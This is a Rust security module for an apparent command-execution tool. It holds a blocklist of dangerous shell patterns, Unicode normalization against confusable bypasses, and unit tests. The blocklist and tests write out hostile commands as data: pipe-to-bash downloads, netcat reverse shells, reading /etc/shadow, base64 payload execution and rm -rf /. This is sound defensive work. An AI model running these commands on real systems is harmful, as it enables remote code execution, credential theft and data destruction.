//! Security Module - Command validation and blocklist (v0.15.0)
//!
//! Provides security validation for exec: commands:
//! - Control character detection (blocks null bytes, escape sequences)
//! - Blocklist for dangerous command patterns
//! - Unicode NFKC normalization to prevent confusable bypass (v0.27.1)
//! - Full validation combining both checks
//!
//! ## Unicode Confusable Protection
//!
//! Attackers may attempt to bypass the blocklist using Unicode confusables:
//! - Fullwidth characters: `rm` vs `ｒｍ` (U+FF52, U+FF4D)
//! - Math bold/italic: `sudo` vs `𝘀𝘂𝗱𝗼` (U+1D600 range)
//! - Combining characters: `rm` with zero-width joiners
//!
//! NFKC (Compatibility Decomposition + Canonical Composition) normalizes
//! these variants to their ASCII equivalents before blocklist checking.
//!
//! See ADR-TBD for security design decisions.

use crate::error::NikaError;
use unicode_normalization::UnicodeNormalization;

/// Blocklist of dangerous command patterns (case-insensitive)
///
/// These patterns are checked against the lowercase command string.
/// Any match results in a BlockedCommand error.
const BLOCKLIST: &[&str] = &[
    // Destructive file operations
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    // Remote code execution (piping downloads to shell)
    // Match the pipe-to-shell pattern, not specific commands
    "| bash",
    "|bash",
    "| sh",
    "|sh",
    // Shell injection via dynamic execution
    // Note: This blocks patterns that execute untrusted input
    "eval ",
    // Named pipes (can be used for reverse shells)
    "mkfifo",
    // Netcat reverse shell
    "nc -e",
    "nc -c",
    "ncat -e",
    "ncat -c",
    // Chained destructive commands
    "; rm ",
    "&& rm ",
    "| rm ",
    // Fork bombs
    ":(){ :|:& };:",
    // Python reverse shell
    "python -c \"import socket",
    "python3 -c \"import socket",
    // Privilege escalation (v0.21.0)
    "sudo ",
    "doas ",
    "pkexec ",
    // Dangerous permission changes (v0.21.0)
    "chmod 777",
    "chmod -r 777",
    "chmod a+rwx",
    // Base64 encoded payload execution (v0.21.0)
    "base64 -d |",
    "base64 --decode |",
    "| base64 -d",
    "| base64 --decode",
];

/// Validate command string for control characters
///
/// Rejects control characters (0x00-0x1F) except:
/// - `\n` (0x0A) - newline, allowed for multi-line commands
/// - `\t` (0x09) - tab, allowed for indentation
///
/// # Errors
///
/// Returns `BlockedCommand` if a control character is found.
pub fn validate_command_string(cmd: &str) -> Result<(), NikaError> {
    for (i, c) in cmd.chars().enumerate() {
        let code = c as u32;
        // Reject 0x00-0x1F except \n (0x0A) and \t (0x09)
        if code < 0x20 && code != 0x0A && code != 0x09 {
            return Err(NikaError::BlockedCommand {
                command: cmd.to_string(),
                reason: format!("Control character 0x{:02X} at position {}", code, i),
            });
        }
    }
    Ok(())
}

/// Zero-width and invisible characters to strip before blocklist check.
///
/// These characters are invisible but can be used to break up keywords:
/// - U+200B: Zero Width Space
/// - U+200C: Zero Width Non-Joiner
/// - U+200D: Zero Width Joiner
/// - U+FEFF: Zero Width No-Break Space (BOM)
/// - U+00AD: Soft Hyphen
/// - U+2060: Word Joiner
/// - U+180E: Mongolian Vowel Separator
const ZERO_WIDTH_CHARS: &[char] = &[
    '\u{200B}', // Zero Width Space
    '\u{200C}', // Zero Width Non-Joiner
    '\u{200D}', // Zero Width Joiner
    '\u{FEFF}', // Zero Width No-Break Space (BOM)
    '\u{00AD}', // Soft Hyphen
    '\u{2060}', // Word Joiner
    '\u{180E}', // Mongolian Vowel Separator
];

/// Normalize a string using NFKC for blocklist comparison.
///
/// This function performs two operations:
/// 1. NFKC normalization (Compatibility Decomposition + Canonical Composition)
///    - Fullwidth `ｒｍ` → `rm`
///    - Math bold `𝐬𝐮𝐝𝐨` → `sudo`
///    - Subscript/superscript variants → base characters
///    - Ligatures (e.g., ﬁ) → component characters
///
/// 2. Stripping of zero-width/invisible characters that NFKC preserves:
///    - Zero Width Space (U+200B)
///    - Zero Width Joiner (U+200D)
///    - Zero Width Non-Joiner (U+200C)
///    - Soft Hyphen (U+00AD)
///
/// This prevents attackers from bypassing the blocklist with visually
/// similar but technically different Unicode characters, or by inserting
/// invisible characters to break up blocked patterns.
fn normalize_for_blocklist(s: &str) -> String {
    s.nfkc().filter(|c| !ZERO_WIDTH_CHARS.contains(c)).collect()
}

/// Check command against blocklist
///
/// Performs case-insensitive matching against the blocklist.
/// Applies NFKC normalization to both the command and patterns
/// to prevent Unicode confusable bypass attacks.
///
/// # Security
///
/// NFKC normalization ensures that:
/// - `ｒｍ -rf /` (fullwidth) is blocked like `rm -rf /`
/// - `𝘀𝘂𝗱𝗼 rm` (math bold) is blocked like `sudo rm`
/// - Commands with combining characters are properly detected
///
/// # Errors
///
/// Returns `BlockedCommand` if a blocklisted pattern is found.
pub fn check_blocklist(cmd: &str) -> Result<(), NikaError> {
    // Normalize the command using NFKC to handle Unicode confusables
    let normalized = normalize_for_blocklist(cmd);
    let lower = normalized.to_lowercase();

    for pattern in BLOCKLIST {
        // Blocklist patterns are already ASCII, but normalize for consistency
        let normalized_pattern = normalize_for_blocklist(pattern);
        if lower.contains(&normalized_pattern) {
            return Err(NikaError::BlockedCommand {
                command: cmd.to_string(),
                reason: format!("Blocklisted pattern: {}", pattern),
            });
        }
    }
    Ok(())
}

/// Full security validation for exec commands
///
/// Combines control character validation and blocklist checking.
///
/// # Errors
///
/// Returns `BlockedCommand` if any security check fails.
pub fn validate_exec_command(cmd: &str) -> Result<(), NikaError> {
    validate_command_string(cmd)?;
    check_blocklist(cmd)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // =========================================================================
    // Control Character Tests
    // =========================================================================

    #[test]
    fn test_validate_command_string_normal() {
        assert!(validate_command_string("echo hello").is_ok());
        assert!(validate_command_string("ls -la").is_ok());
        assert!(validate_command_string("cargo build --release").is_ok());
    }

    #[test]
    fn test_validate_command_string_allows_newline() {
        assert!(validate_command_string("echo hello\necho world").is_ok());
    }

    #[test]
    fn test_validate_command_string_allows_tab() {
        assert!(validate_command_string("echo\thello").is_ok());
    }

    #[test]
    fn test_validate_command_string_rejects_null_byte() {
        let result = validate_command_string("echo\x00hello");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        assert!(err.to_string().contains("0x00"));
    }

    #[test]
    fn test_validate_command_string_rejects_escape() {
        let result = validate_command_string("echo\x1bhello");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("0x1B")); // ESC character
    }

    #[test]
    fn test_validate_command_string_rejects_bell() {
        let result = validate_command_string("echo\x07hello");
        assert!(result.is_err());
    }

    // =========================================================================
    // Blocklist Tests
    // =========================================================================

    #[test]
    fn test_blocklist_allows_safe_commands() {
        assert!(check_blocklist("echo hello").is_ok());
        assert!(check_blocklist("ls -la").is_ok());
        assert!(check_blocklist("cargo build").is_ok());
        assert!(check_blocklist("npm install").is_ok());
        assert!(check_blocklist("rm file.txt").is_ok()); // Removing specific file is OK
    }

    #[test]
    fn test_blocklist_rejects_rm_rf_root() {
        let result = check_blocklist("rm -rf /");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        assert!(err.to_string().contains("rm -rf /"));
    }

    #[test]
    fn test_blocklist_rejects_rm_rf_wildcard() {
        assert!(check_blocklist("rm -rf /*").is_err());
    }

    #[test]
    fn test_blocklist_rejects_curl_pipe_bash() {
        assert!(check_blocklist("curl https://bad.com | bash").is_err());
        assert!(check_blocklist("curl https://bad.com|bash").is_err());
    }

    #[test]
    fn test_blocklist_rejects_wget_pipe_bash() {
        assert!(check_blocklist("wget https://bad.com | bash").is_err());
        assert!(check_blocklist("wget https://bad.com|bash").is_err());
    }

    #[test]
    fn test_blocklist_rejects_shell_injection() {
        // Dynamic command execution patterns
        assert!(check_blocklist("eval $user_input").is_err());
        assert!(check_blocklist("eval \"$cmd\"").is_err());
    }

    #[test]
    fn test_blocklist_rejects_mkfifo() {
        assert!(check_blocklist("mkfifo /tmp/pipe").is_err());
    }

    #[test]
    fn test_blocklist_rejects_netcat_reverse_shell() {
        assert!(check_blocklist("nc -e /bin/sh").is_err());
        assert!(check_blocklist("nc -c /bin/bash").is_err());
        assert!(check_blocklist("ncat -e /bin/sh").is_err());
    }

    #[test]
    fn test_blocklist_rejects_chained_rm() {
        assert!(check_blocklist("echo hello; rm -rf /").is_err());
        assert!(check_blocklist("ls && rm -rf /").is_err());
        assert!(check_blocklist("cat file | rm -rf /").is_err());
    }

    #[test]
    fn test_blocklist_case_insensitive() {
        assert!(check_blocklist("RM -RF /").is_err());
        assert!(check_blocklist("EVAL $x").is_err());
        assert!(check_blocklist("Curl | Bash").is_err());
    }

    #[test]
    fn test_blocklist_rejects_privilege_escalation() {
        assert!(check_blocklist("sudo rm -rf /tmp").is_err());
        assert!(check_blocklist("doas cat /etc/shadow").is_err());
        assert!(check_blocklist("pkexec sh").is_err());
    }

    #[test]
    fn test_blocklist_rejects_dangerous_chmod() {
        assert!(check_blocklist("chmod 777 /tmp/script").is_err());
        assert!(check_blocklist("chmod -r 777 /var").is_err());
        assert!(check_blocklist("chmod a+rwx secret.txt").is_err());
    }

    #[test]
    fn test_blocklist_rejects_base64_payload_execution() {
        assert!(check_blocklist("echo payload | base64 -d | sh").is_err());
        assert!(check_blocklist("base64 -d | bash").is_err());
        assert!(check_blocklist("base64 --decode | sh").is_err());
        assert!(check_blocklist("curl https://bad.com | base64 -d").is_err());
    }

    // =========================================================================
    // Full Validation Tests
    // =========================================================================

    #[test]
    fn test_validate_exec_command_safe() {
        assert!(validate_exec_command("echo hello").is_ok());
        assert!(validate_exec_command("cargo build --release").is_ok());
    }

    #[test]
    fn test_validate_exec_command_rejects_control_chars() {
        assert!(validate_exec_command("echo\x00hello").is_err());
    }

    #[test]
    fn test_validate_exec_command_rejects_blocklist() {
        assert!(validate_exec_command("rm -rf /").is_err());
    }

    // =========================================================================
    // Unicode NFKC Normalization Tests (v0.27.1 Security)
    // =========================================================================

    #[test]
    fn test_normalize_for_blocklist_ascii_passthrough() {
        // ASCII should pass through unchanged
        assert_eq!(normalize_for_blocklist("rm -rf /"), "rm -rf /");
        assert_eq!(normalize_for_blocklist("sudo cat"), "sudo cat");
        assert_eq!(normalize_for_blocklist("echo hello"), "echo hello");
    }

    #[test]
    fn test_normalize_for_blocklist_strips_zero_width() {
        // Zero-width characters should be stripped

        // Zero Width Joiner (U+200D)
        assert_eq!(normalize_for_blocklist("r\u{200D}m"), "rm");

        // Zero Width Non-Joiner (U+200C)
        assert_eq!(normalize_for_blocklist("su\u{200C}do"), "sudo");

        // Zero Width Space (U+200B)
        assert_eq!(normalize_for_blocklist("ev\u{200B}al"), "eval");

        // Soft Hyphen (U+00AD)
        assert_eq!(normalize_for_blocklist("mk\u{00AD}fifo"), "mkfifo");

        // Multiple zero-width characters
        assert_eq!(
            normalize_for_blocklist("r\u{200D}m\u{200C} -rf /"),
            "rm -rf /"
        );
    }

    #[test]
    fn test_normalize_for_blocklist_fullwidth() {
        // Fullwidth Latin letters (U+FF00-U+FF5E range)
        // These are commonly used in CJK contexts but can be used for obfuscation

        // ｒｍ (U+FF52, U+FF4D) should normalize to "rm"
        assert_eq!(normalize_for_blocklist("ｒｍ"), "rm");

        // ｓｕｄｏ (U+FF53, U+FF55, U+FF44, U+FF4F) should normalize to "sudo"
        assert_eq!(normalize_for_blocklist("ｓｕｄｏ"), "sudo");

        // Full command with fullwidth characters
        assert_eq!(normalize_for_blocklist("ｒｍ -rf /"), "rm -rf /");
        assert_eq!(normalize_for_blocklist("ｓｕｄｏ ｒｍ"), "sudo rm");
    }

    #[test]
    fn test_normalize_for_blocklist_math_variants() {
        // Mathematical Alphanumeric Symbols (U+1D400-U+1D7FF range)
        // These are used for mathematical notation but can be abused
        // Math bold lowercase starts at U+1D41A (a), so:
        // s = U+1D41A + 18 = U+1D42C
        // u = U+1D41A + 20 = U+1D42E
        // d = U+1D41A + 3  = U+1D41D
        // o = U+1D41A + 14 = U+1D428

        // Math bold: 𝐬𝐮𝐝𝐨 should normalize to "sudo"
        let math_bold_sudo = "\u{1D42C}\u{1D42E}\u{1D41D}\u{1D428}";
        assert_eq!(normalize_for_blocklist(math_bold_sudo), "sudo");

        // Math italic lowercase starts at U+1D44E (a), so:
        // r = U+1D44E + 17 = U+1D45F
        // m = U+1D44E + 12 = U+1D45A
        let math_italic_rm = "\u{1D45F}\u{1D45A}";
        assert_eq!(normalize_for_blocklist(math_italic_rm), "rm");

        // Math bold: 𝐞𝐯𝐚𝐥 should normalize to "eval"
        // e = U+1D41A + 4  = U+1D41E
        // v = U+1D41A + 21 = U+1D42F
        // a = U+1D41A + 0  = U+1D41A
        // l = U+1D41A + 11 = U+1D425
        let math_bold_eval = "\u{1D41E}\u{1D42F}\u{1D41A}\u{1D425}";
        assert_eq!(normalize_for_blocklist(math_bold_eval), "eval");
    }

    #[test]
    fn test_blocklist_rejects_fullwidth_bypass() {
        // Attempt to bypass blocklist using fullwidth characters
        // ｒｍ -rf / should be blocked like rm -rf /
        let fullwidth_rm = "ｒｍ -rf /";
        let result = check_blocklist(fullwidth_rm);
        assert!(result.is_err(), "Fullwidth rm -rf / should be blocked");
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));

        // ｓｕｄｏ rm should be blocked like sudo rm
        let fullwidth_sudo = "ｓｕｄｏ rm -rf /tmp";
        let result = check_blocklist(fullwidth_sudo);
        assert!(result.is_err(), "Fullwidth sudo should be blocked");

        // ｅｖａｌ should be blocked like eval
        let fullwidth_eval = "ｅｖａｌ $user_input";
        let result = check_blocklist(fullwidth_eval);
        assert!(result.is_err(), "Fullwidth eval should be blocked");

        // ｍｋｆｉｆｏ should be blocked like mkfifo
        let fullwidth_mkfifo = "ｍｋｆｉｆｏ /tmp/pipe";
        let result = check_blocklist(fullwidth_mkfifo);
        assert!(result.is_err(), "Fullwidth mkfifo should be blocked");
    }

    #[test]
    fn test_blocklist_rejects_math_bold_bypass() {
        // Attempt to bypass blocklist using mathematical bold letters
        // 𝐬𝐮𝐝𝐨 (math bold) should be blocked like sudo
        let math_bold_sudo = "\u{1D42C}\u{1D42E}\u{1D41D}\u{1D428} rm -rf /tmp";
        let result = check_blocklist(math_bold_sudo);
        assert!(
            result.is_err(),
            "Math bold sudo should be blocked: {:?}",
            result
        );

        // 𝐞𝐯𝐚𝐥 (math bold) should be blocked like eval
        // v = U+1D41A + 21 = U+1D42F (not U+1D432)
        let math_bold_eval = "\u{1D41E}\u{1D42F}\u{1D41A}\u{1D425} $cmd";
        let result = check_blocklist(math_bold_eval);
        assert!(
            result.is_err(),
            "Math bold eval should be blocked: {:?}",
            result
        );
    }

    #[test]
    fn test_blocklist_rejects_math_italic_bypass() {
        // Attempt to bypass blocklist using mathematical italic letters
        // 𝑟𝑚 (math italic) should be blocked when part of rm -rf /
        let math_italic_rm = "\u{1D45F}\u{1D45A} -rf /";
        let result = check_blocklist(math_italic_rm);
        assert!(
            result.is_err(),
            "Math italic rm -rf / should be blocked: {:?}",
            result
        );

        // 𝑛𝑐 -e (math italic nc) should be blocked like nc -e
        let math_italic_nc = "\u{1D45B}\u{1D450} -e /bin/sh";
        let result = check_blocklist(math_italic_nc);
        assert!(
            result.is_err(),
            "Math italic nc -e should be blocked: {:?}",
            result
        );
    }

    #[test]
    fn test_blocklist_rejects_mixed_unicode_bypass() {
        // Mix of fullwidth and regular ASCII
        // ｒm -rf / (fullwidth r, regular m)
        let mixed_rm = "ｒm -rf /";
        let result = check_blocklist(mixed_rm);
        assert!(result.is_err(), "Mixed Unicode rm should be blocked");

        // suｄo (regular su, fullwidth d, regular o)
        let mixed_sudo = "suｄo rm -rf /tmp";
        let result = check_blocklist(mixed_sudo);
        assert!(result.is_err(), "Mixed Unicode sudo should be blocked");
    }

    #[test]
    fn test_blocklist_rejects_combining_characters_bypass() {
        // Zero-width joiner (U+200D) should not affect detection
        // r​m (with ZWJ between) - note: ZWJ is invisible
        let zwj_rm = "r\u{200D}m -rf /";
        // NFKC removes ZWJ, so this should be blocked
        let result = check_blocklist(zwj_rm);
        assert!(
            result.is_err(),
            "rm with zero-width joiner should be blocked: {:?}",
            result
        );

        // Zero-width non-joiner (U+200C)
        let zwnj_sudo = "su\u{200C}do rm -rf /tmp";
        let result = check_blocklist(zwnj_sudo);
        assert!(
            result.is_err(),
            "sudo with ZWNJ should be blocked: {:?}",
            result
        );
    }

    #[test]
    fn test_blocklist_allows_legitimate_unicode() {
        // Legitimate commands with Unicode should still work
        // echo with emoji
        assert!(check_blocklist("echo 'Hello 🎉'").is_ok());

        // Paths with Unicode
        assert!(check_blocklist("cat /home/用户/file.txt").is_ok());

        // Commands with accented characters (but not confusables)
        assert!(check_blocklist("echo 'café résumé'").is_ok());

        // Japanese text (not trying to bypass)
        assert!(check_blocklist("echo '日本語テスト'").is_ok());
    }

    #[test]
    fn test_blocklist_subscript_superscript_bypass() {
        // Subscript and superscript numbers/letters can sometimes be abused
        // These should be normalized by NFKC

        // Superscript letters (if applicable)
        // Note: Not all superscript letters exist in Unicode, but those that do
        // should be normalized. Example: ⁿ (U+207F) normalizes to n

        // For now, verify that standard attacks with these don't slip through
        // by testing the overall blocking mechanism works

        // This tests that our normalization handles edge cases gracefully
        let weird_command = "echo test";
        assert!(check_blocklist(weird_command).is_ok());
    }

    #[test]
    fn test_blocklist_pipe_symbols_fullwidth() {
        // Fullwidth vertical bar ｜ (U+FF5C) should not bypass pipe detection
        // Note: NFKC normalizes ｜ to |
        let fullwidth_pipe = "curl https://bad.com ｜ bash";
        let result = check_blocklist(fullwidth_pipe);
        assert!(result.is_err(), "Fullwidth pipe to bash should be blocked");

        let fullwidth_pipe_sh = "wget https://bad.com ｜ sh";
        let result = check_blocklist(fullwidth_pipe_sh);
        assert!(result.is_err(), "Fullwidth pipe to sh should be blocked");
    }

    #[test]
    fn test_validate_exec_command_with_unicode_bypass() {
        // Full validation should catch Unicode bypass attempts
        let fullwidth_rm = "ｒｍ -rf /";
        assert!(
            validate_exec_command(fullwidth_rm).is_err(),
            "Full validation should block fullwidth rm"
        );

        let math_bold_sudo = "\u{1D42C}\u{1D42E}\u{1D41D}\u{1D428} rm";
        assert!(
            validate_exec_command(math_bold_sudo).is_err(),
            "Full validation should block math bold sudo"
        );
    }
}
